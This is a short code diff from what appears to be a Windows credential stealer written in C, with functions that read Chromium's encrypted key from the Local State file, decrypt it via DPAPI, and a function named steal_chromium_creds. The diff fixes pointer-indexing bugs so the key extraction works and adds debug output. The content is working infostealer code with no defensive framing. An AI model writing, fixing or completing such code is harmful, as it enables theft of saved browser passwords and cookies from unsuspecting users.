@@ -202,8 +202,8 @@ static int retrieve_encrypted_key(PWSTR localStatePath, PSTR *encryptedKeyOut) {
   }
 
   strncpy(*encryptedKeyOut, start, length);
-  *encryptedKeyOut[length] = '\0';
-
+  (*encryptedKeyOut)[length] = '\0';
+  
   free(fileBuffer);
   return EXIT_SUCCESS;
 }
@@ -231,7 +231,7 @@ static int decrypt_key(BYTE *encryptedKey, DWORD encryptedKeyLen,
   }
 
   memcpy(*decryptedKeyOut, decryptedBlob.pbData, decryptedBlob.cbData);
-  *decryptedKeyOut[decryptedBlob.cbData] = '\0';
+  (*decryptedKeyOut)[decryptedBlob.cbData] = '\0';
 
   LocalFree(decryptedBlob.pbData);
 
@@ -298,7 +298,9 @@ int steal_chromium_creds() {
   BYTE *decodedKey = (BYTE *)malloc(decodedKeySize + 1);
   b64_decode((BYTE *)encryptedKey, strlen(encryptedKey), decodedKey);
   decodedKey[decodedKeySize] = '\0';
+  /// DEBUG
   printf("decoded_encrypted_key_len: %d\n", decodedKeySize);
+  ///
 
   // Remove the DPAPI at the start as this not part of the key
   // Allocate memory for the new string
